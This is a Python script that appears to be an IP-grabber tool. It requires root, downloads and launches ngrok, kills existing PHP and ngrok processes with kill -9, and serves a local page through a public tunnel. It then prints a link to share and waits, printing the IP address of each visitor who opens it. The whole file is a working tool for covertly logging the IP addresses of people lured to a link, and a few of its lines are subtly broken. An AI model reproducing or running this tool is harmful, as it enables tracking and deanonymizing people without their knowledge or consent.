#!/usr/bin/python3

import requests, sys, subprocess, time, os, zipfile, socket, signal, re
from colorama import Fore, init

init(autoreset=True)

# colors
lgcyan, ylw, lgred, mgta, green = Fore.LIGHTCYAN_EX, Fore.YELLOW, Fore.LIGHTRED_EX, Fore.MAGENTA, Fore.GREEN

def banner():
	print(ylw + """  __________________________________""")
	print(ylw + """ |              __  __   __ ___  ___|""")
	print(ylw + """ |  \ | / |__| |__ |__| |__  |  |__ |""")
	print(ylw + """ |  |_|_| |  | |__ |  \ |__ _|_ ___||""")
	print(ylw + """((_(-,-----------.-.-----------.-.)`)""")
	print(ylw + """ \__ )        ,'     `.         \ _/""")
	print(ylw + """ :  :        |_________|        :  :""")
	print(ylw + """ |-'|       ,'-.-.--.-.`.       |`-|""")
	print(ylw + """ |_.|      (( (*  )(*  )))      |._|""")
	print(ylw + """ |  |       `.-`-'--`-'.'       |  |""")
	print(ylw + """ |-'|        | ,-.-.-. |        |._|""")
	print(ylw + """ |  |        |(|-|-|-|)|        |  |""")
	print(ylw + """ :,':        |_`-'-'-'_|        ;`.;""")
	print(ylw + """  \  \     ,'           `.     /._/""")
	print(ylw + """   \/ `._ /_______________\___/ \/""")
	print(ylw + """    \  / :   ____________  : \, /""")
	print(ylw + """     `.| |  |            |  ||.'""")
	print(ylw + """       `.|  |            |  |.""")
	print(ylw + """         |  | """ + lgred + """ c0rnf13ld """ + ylw +"""|  |""")

if len(sys.argv) != 2:
	banner()
	print(f"\n\nUsage: python3 {sys.argv[0]} <port>")
	sys.exit(1)

if sys.argv[1] == "443":
	print("[!] Port 443 not allowed")
	sys.exit(1)

# Global Variables
port = sys.argv[1]
ngrok_install_url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
ngrok_link = "http://127.0.0.1:4040/api/tunnels/"

def checkConnection():
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.settimeout(2)
		if not s.connect_ex(("142.250.219.206", 80)):
			return True
			s.close()
		else:
			print(lgred + "[*] No internet connection\n")
			s.close()
			sys.exit(1)

def downloadNgrok():
	print(lgcyan + "[*] Downloading Ngrok....")
	download = subprocess.run(f"wget {ngrok_install_url}", stderr=subprocess.DEVNULL, shell=True)
	print(green + "[*] Download completed")

def installNgrok():
	time.sleep(2)
	print(lgcyan + "[*] Installing Ngrok...")
	with zipfile.ZipFile("ngrok-stable-linux-amd64.zip", "r") as zip:
		zip.extractall()
	print(green + "[*] Install Completed")

def checkPhpProc():
	check_php = subprocess.Popen("ps aux | grep -E \"php -S|php --server\" | grep -v \"grep\" | awk '{print $2}'", shell=True, stdout=subprocess.PIPE, text=True)
	out, err = check_php.communicate()
	return out, err

def checkNgrokProc():
	check_ngrok = subprocess.Popen("ps aux | grep -E \"ngrok\" | grep -v \"grep\" | awk '{print $2}'", shell=True, stdout=subprocess.PIPE, text=True)
	out, err = check_ngrok.communicate()
	return out, err

def killProc(out):
	time.sleep(1)
	out = out[:-1]
	if "," not in out:
		kill_process = subprocess.Popen(["bash", "-c", f"kill -9 {out}"], stdout=subprocess.DEVNULL)
		print(lgred + "[*] Processes Killed")
	else:
		out = out.replace("\n", ",")
		kill_process = subprocess.Popen(["bash", "-c", f"kill -9 {{{out}}}"], stdout=subprocess.DEVNULL)
		print(lgred + "[*] Processes Killed")
	time.sleep(2)

def uploadServers():
	time.sleep(1)
	global php_process, ngrok_process
	print(ylw + f"[*] Starting PHP Server on Port {port}...")
	php_process = subprocess.Popen(f"cd ip && php -S 127.0.0.1:{port}", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
	time.sleep(2)
	print(ylw + f"[*] Starting Ngrok on Port {port}...")
	ngrok_process = subprocess.Popen(f"./ngrok http {port}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
	time.sleep(1)

def capLink():
	r = requests.get(ngrok_link)
	link = re.findall(r"public_url\":\"(https.*?)\",\"proto\":\"https\"", r.text)[0]
	return link

def def_handler(sig, frame):
	print(lgred + "\n\n[*] Exiting...\n")
	os.killpg(os.getpgid(php_process.pid), signal.SIGTERM) # SIGTERM es la señal que generalmente se usa para terminar administrativamente un proceso
	os.killpg(os.getpgid(ngrok_process.pid), signal.SIGTERM)
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':

	if os.environ.get("USER") != "root": # Check if root
		print(lgred + "[*] You must run the script as root.")
		sys.exit(1)

	internet = checkConnection()
	if internet:
		banner()
		print()
		if "ip_addr.txt" in os.listdir("ip"):
			os.remove("ip_addr.txt")

		dir_content = os.listdir()
		if not "ngrok" in dir_content:
			downloadNgrok()
			installNgrok()
			subprocess.run("chmod +x ngrok", shell=True)
			os.remove("ngrok-stable-linux-amd64.zip")

		out, err = checkPhpProc()
		if out:
			print(mgta + "[*] Killing php -S|php --server Processes...")
			killProc(out)

		out, err = checkNgrokProc()
		if out:
			print(mgta + "[*] Killing Ngrok Process...")
			killProc(out)

		uploadServers()
		print(green + "[*] All servers have been started.")
		time.sleep(3)
		os.system('clear')

		link = capLink()
		print(lgcyan + "[*] Share this link:")
		print(lgcyan + f"|______ [~] Link: {ylw + link}")
		print(mgta + f"\n[*] Waiting for connections...\n")
		while True:
			if "ip_addr.txt" in os.listdir("ip"):
				print(ylw + "\t\t[-] Saved in ip/ip.txt\n")
				verify = subprocess.Popen("cat ip/ip_addr.txt", shell=True, text=True, stdout=subprocess.PIPE)
				out, err = verify.communicate()
				print(out)
				os.remove("ip/ip_addr.txt")